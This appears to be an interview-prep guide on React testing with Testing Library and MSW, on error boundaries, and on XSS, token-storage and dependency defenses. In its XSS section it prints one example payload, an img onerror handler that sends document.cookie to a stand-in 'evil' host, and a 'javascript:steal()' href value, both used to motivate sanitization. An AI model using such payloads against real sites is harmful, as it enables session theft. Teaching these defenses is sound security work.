Testing, Errors & Security

React gives you less XSS protection than Angular by default. The testing philosophy is the part worth internalising.

🟡 Intermediate 🔴 Advanced 🔥 Must know
Quick revision
  • Query by role and label, not by test id or class name.
  • user-event, not fireEvent — it simulates real interaction.
  • JSX escapes text by default, so {userInput} is safe.
  • dangerouslySetInnerHTML has no sanitizer — unlike Angular's [innerHTML].
  • An href from user data can be javascript: — React won't stop it.

Testing Library's philosophy 🔥 Must know

The guiding principle

"The more your tests resemble the way your software is used, the more confidence they can give you."

So you query the DOM the way a user finds things — by visible text, by role, by label — rather than by implementation details like class names or component internals.

// Breaks if the class name changes, the wrapper div moves, or state is renamed
const button = container.querySelector('.btn-primary');
expect(wrapper.state('isLoading')).toBe(true);
expect(container.querySelectorAll('.row')).toHaveLength(3);
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

test('submits the order and shows confirmation', async () => {
  const user = userEvent.setup();
  render(<OrderForm onSubmit={jest.fn()} />);

  // Found the way a user (or a screen reader) finds them
  await user.type(screen.getByLabelText(/reference/i), 'ORD-1041');
  await user.click(screen.getByRole('button', { name: /save/i }));

  // Assert on what the user sees
  expect(await screen.findByText(/order saved/i)).toBeInTheDocument();
});
QueryPreference
getByRoleFirst choice. Matches how assistive tech sees the page
getByLabelTextForm fields. Also verifies the label is associated
getByTextNon-interactive content
getByPlaceholderTextOnly if there's no label — which is itself a problem
getByTestIdLast resort. Invisible to users
querySelectorAvoid — couples to markup
Senior signal — role-based queries test accessibility for free

If getByRole('button', { name: /save/i }) can't find your element, that's usually because it isn't a button — it's a div with a click handler, which a screen reader also can't identify.

So the test failing is telling you something real. Query by role and your test suite becomes a partial accessibility check without any extra effort.

That's a genuinely good argument for the query priority, and better than "it's the recommended practice". It's also why reaching for getByTestId to make a test pass can be hiding a real problem rather than solving a testing one.

user-event over fireEvent

fireEvent.click() dispatches a single click event. A real click isn't one event — it's pointer down, mouse down, focus, mouse up, click.

userEvent.click() fires the whole sequence. So it catches bugs fireEvent misses — a handler depending on focus, a disabled button that fireEvent will happily "click" anyway, or typing that needs individual key events.

Same for typing: fireEvent.change sets the value in one go, while user.type fires per character — which is what a debounced input or a character-limit handler actually experiences.

Remember userEvent.setup() and await every interaction; they're async by design.

Mock at the network boundary, not your own modules
// MSW intercepts at the network level - your fetch code runs for real
const server = setupServer(
  http.get('/api/orders', () => HttpResponse.json([{ id: '1', reference: 'A' }]))
);

Mocking your own orderService.getOrders means the service's real logic — error handling, response mapping, retry — is never exercised, and the mock drifts from reality when the service changes.

Intercepting HTTP means everything above the network runs genuinely, and you can assert on the request shape. It also makes tests resilient to refactoring the data layer, which is exactly the kind of change you want tests to survive.

Error boundaries 🔥 Must know

class ErrorBoundary extends React.Component<Props, State> {
  state = { hasError: false };

  static getDerivedStateFromError() {
    return { hasError: true };          // render the fallback
  }

  componentDidCatch(error: Error, info: React.ErrorInfo) {
    logToMonitoring(error, info.componentStack);   // report it
  }

  render() {
    if (this.state.hasError) return this.props.fallback;
    return this.props.children;
  }
}
CaughtNot caught

The gap that surprises people

An error boundary only catches errors thrown during rendering. So this is not caught: 

<button onClick={() => { throw new Error('boom'); }}>Click</button>
// Escapes to window.onerror. The boundary never sees it.

Nor is a rejected promise in an effect, or a failed fetch.

React's reasoning is that render errors leave the UI in an unknown state and must be contained, whereas an event handler error doesn't corrupt the tree — so you should handle it locally.

Practically that means: try/catch in handlers, React Query's error state for data, a global window.onerror and unhandledrejection listener as a safety net, and error boundaries for the rendering layer. No single mechanism covers everything, and assuming a boundary does is the mistake.

Place boundaries per feature, not just at the root

A single root boundary means any render error blanks the whole application.

A boundary around each major region — the sidebar, a dashboard widget, a data table — means a failure in one widget shows a localised "couldn't load this" while everything else keeps working.

That's a much better outcome and it's cheap to do. react-error-boundary gives a hook-friendly wrapper with a reset function, so the user can retry without a full page reload.

XSS in React 🔥 Must know

What React protects by default

JSX escapes interpolated values. So {userInput} containing a script tag renders as visible text, never as executable markup.

That covers the large majority of XSS risk — but React's protection is narrower than Angular's, and the differences matter.

CaseReactAngular
Text interpolationEscapedEscaped
Raw HTML insertiondangerouslySetInnerHTML — no sanitization[innerHTML] — sanitized
href with javascript:Not blocked (warns in dev)Sanitized
Style objectsSafe — object syntax, not a stringSanitized
The two React-specific holes

1. dangerouslySetInnerHTML does nothing to sanitize. Angular's [innerHTML] strips scripts and event handlers automatically; React's equivalent inserts exactly what you give it. The name is the warning, and there is no safety net behind it. 

<div dangerouslySetInnerHTML={{ __html: comment.body }} />
// <img src=x onerror="fetch('//evil/'+document.cookie)"> executes.
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(comment.body, { ALLOWED_TAGS: ['b','i','em','strong','a','p'] })
}} />

2. A user-controlled href can be a javascript: URL. 

<a href={profile.website}>Website</a>
// profile.website = "javascript:steal()" - clicking it executes.
function safeUrl(url: string) {
  try {
    const parsed = new URL(url, window.location.origin);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol) ? url : '#';
  } catch { return '#'; }
}
<a href={safeUrl(profile.website)} rel="noopener noreferrer">Website</a>
Sanitize server-side on write where you can

Sanitizing at render time means every read path has to remember — and one that forgets is the vulnerability. A new component rendering the same comment field reintroduces the hole.

Sanitizing on write, server-side, means the stored value is already safe regardless of how it's later displayed — including by a mobile app or an export that doesn't go through React at all.

Best is both: sanitize on write as the control, and on render as defence in depth. Same layered reasoning as database constraints plus application validation.

The recommended shape

Short-lived access token in memory. Refresh token in an HttpOnly, Secure, SameSite cookie.

On page load there's no access token, so the app calls the refresh endpoint — which authenticates using the cookie the browser sends automatically and JavaScript cannot read.

An XSS payload can then use the API while the page is open, which is bad. It cannot exfiltrate a long-lived credential to use later from elsewhere. That's the meaningful difference, and it's worth stating precisely rather than claiming XSS is solved.

Cookies mean you need CSRF protection — SameSite=Lax plus a token on state-changing requests.

Content Security Policy is the layer that limits damage

A strict CSP restricts what an injected script can do even when it runs — no inline scripts, and connect-src limiting which origins can be contacted, which blocks exfiltration to an attacker's domain.

That's the difference between "an attacker ran code" and "an attacker took your data". Worth mentioning because it shows layered thinking: escaping prevents most XSS, sanitization handles the raw-HTML case, HttpOnly limits what's stealable, CSP limits what's reachable.

Dependency risk 🔴 Advanced

The React ecosystem's structural weakness

Because React ships only a renderer, a typical application pulls in routing, data fetching, forms, validation, a component library and dozens of transitive dependencies. That's a large surface, and every one runs in your build and often in your users' browsers.

There have been real incidents where a compromised or hijacked package stole credentials from applications that merely depended on it transitively.

Practical mitigations: lockfiles committed so builds are reproducible; npm audit or Dependabot in CI; npm ci rather than npm install in pipelines; scrutiny before adding a dependency for something small; and preferring well-maintained packages over convenient obscure ones.

This is a fair point to raise when comparing with Angular, whose batteries-included approach means fewer third-party packages for core concerns. It's a genuine trade-off rather than a criticism of React.

Key takeaways
  • Query by role and label; getByTestId is a last resort.
  • Role-based queries double as an accessibility check.
  • user-event simulates real interaction sequences; fireEvent doesn't.
  • Mock at the network boundary so your real data code runs.
  • Error boundaries catch render errors only — not handlers, not async.
  • Place boundaries per feature so one failure doesn't blank the app.
  • JSX escapes text, but dangerouslySetInnerHTML has no sanitizer at all.
  • A user-supplied href can be javascript: — validate the scheme.
  • Sanitize server-side on write, and on render as defence in depth.
  • Access token in memory, refresh token in an HttpOnly cookie, plus CSRF protection.
  • CSP limits what a successful injection can reach.
  • A large dependency tree is a real supply-chain surface — lockfiles and auditing in CI.

Common mistakes

  • Querying by class name or test id by default.
  • fireEvent where user-event would catch more.
  • Asserting on component internals rather than rendered output.
  • Mocking your own services instead of the network.
  • Assuming an error boundary catches handler or async errors.
  • One root-level boundary only.
  • dangerouslySetInnerHTML without DOMPurify.
  • Unvalidated user-supplied href.
  • JWTs in localStorage.
  • Cookies without CSRF protection.
  • No lockfile discipline or dependency auditing.

Interview questions

Intermediate

How do you prevent XSS in React? 🔥 Must know
How I'd answer

"React's default protection is good: JSX escapes interpolated values, so {userInput} containing a script tag renders as visible text rather than executing. That covers most of the risk automatically."

"But React's protection is narrower than Angular's, and I'd want to be specific about the two gaps."

"dangerouslySetInnerHTML does no sanitization whatsoever. This is the important difference — Angular's [innerHTML] sanitizes automatically, stripping scripts and event handlers while keeping safe markup. React's equivalent inserts exactly what you hand it. The alarming name is the only safeguard."

"So if I need to render rich text — a comment, a CMS field — I'd sanitize with DOMPurify and an explicit allow-list of tags. And I'd prefer to sanitize server-side on write, because sanitizing on render means every read path has to remember, and a new component rendering the same field reintroduces the hole. Sanitizing on write means the stored value is safe however it's later displayed — including by a mobile client that never touches React."

"The second gap is href. <a href={profile.website}> with a value of javascript:steal() executes when clicked. React warns in development but doesn't block it. So any user-controlled URL needs its scheme validated — parse it and allow only http, https and mailto. Same applies to src on iframes and form actions."

"Then the layers beyond escaping, because escaping alone isn't a complete answer."

"Token storage. If XSS does occur, what can it take? A JWT in localStorage is readable by any script, so it can be exfiltrated and reused later from anywhere. An access token in memory plus a refresh token in an HttpOnly cookie means the attacker can act while the page is open but can't take a durable credential away. That's a real reduction in impact, and I'd be careful not to overclaim it as preventing XSS."

"Content Security Policy as defence in depth — blocking inline scripts and restricting connect-src so an injected script can't exfiltrate to an attacker's domain. That's the difference between code running and data leaving."

"And dependencies. Because React applications pull in a lot of third-party packages, a compromised dependency can inject script without any XSS in my own code. Lockfiles committed, npm ci in CI, and automated auditing. That's a genuine part of the XSS threat model for React specifically, given the ecosystem's shape."

What they're really checking
  • Do you know JSX escapes by default?
  • Do you know dangerouslySetInnerHTML has no sanitizer, unlike Angular?
  • Do you catch the href vector?
  • Do you sanitize on write rather than only on render?
  • Do you think in layers — tokens, CSP, dependencies?
Weak answers
  • Red flag: "React handles it automatically."
  • Red flag: assuming dangerouslySetInnerHTML sanitizes.
  • Red flag: no mention of the href case.
Likely follow-ups
  • How would you safely render user-submitted markdown?
  • What's the CSRF implication of using cookies?
  • How does the token refresh flow work?

Advanced

How would you test a component that fetches data? ⭐ Senior-level
How I'd answer

"I'd mock at the network boundary, with something like MSW, rather than mocking my own service module."

"The reason matters: if I mock orderService.getOrders, the service's real logic never runs — no response mapping, no error handling, no retry — and the mock silently drifts from reality when the service changes. Intercepting HTTP means everything above the network executes genuinely, and I can assert on the request that was made."

"It also makes tests survive refactoring the data layer, which is precisely the kind of change I want tests to be indifferent to."

"Then I'd cover the four states, because the failure ones are what break in production and what nobody exercises manually."

"Loading — the skeleton or spinner appears. Success — the data renders. Error — configure the handler to return a 500 and assert the error UI and any retry affordance. Empty — an empty array shows the empty state, not a blank region, which is a genuinely common bug."

"On assertions I'd use findBy* queries for anything asynchronous, since they retry until the element appears or time out. Using getBy* immediately after render fails because the fetch hasn't resolved — and the instinct to fix that with an arbitrary await new Promise(r => setTimeout(r, 100)) is what makes suites flaky. Let the query do the waiting."

"And I'd query by role and label rather than test ids. Beyond resilience to markup changes, if getByRole('button', { name: /retry/i }) can't find the element, that's usually because it isn't a real button — which a screen reader also can't identify. So the query priority gives me a partial accessibility check for free."

"Two React Query specifics. I'd create a fresh QueryClient per test with retries disabled — otherwise cached data leaks between tests and produces order-dependent failures, and the default retry makes an error test wait through several attempts. I'd wrap that in a custom render helper so every test gets the provider without repetition."

"What I'd deliberately not test: that React Query caches correctly, or that useEffect fires. That's testing the library. I'd test my component's behaviour given particular server responses."

"For the genuinely complex parts — a mapping function, a business rule deciding what's displayed — I'd pull those into pure functions and unit test them directly. Far cheaper than driving them through a rendered component, and it makes the component test simpler because there's less logic left in it."

What they're really checking
  • Do you mock the network rather than your own modules, and know why?
  • Do you test error and empty states, not just success?
  • Do you use findBy instead of arbitrary waits?
  • Do you know the fresh-QueryClient-per-test requirement?
  • Do you avoid testing the library?
Weak answers
  • Red flag: mocking the service module.
  • Red flag: only testing the happy path.
  • Red flag: arbitrary setTimeout waits.
Likely follow-ups
  • How do you test an optimistic update and its rollback?
  • How do you keep tests from leaking state between each other?
  • When would you write an E2E test instead?
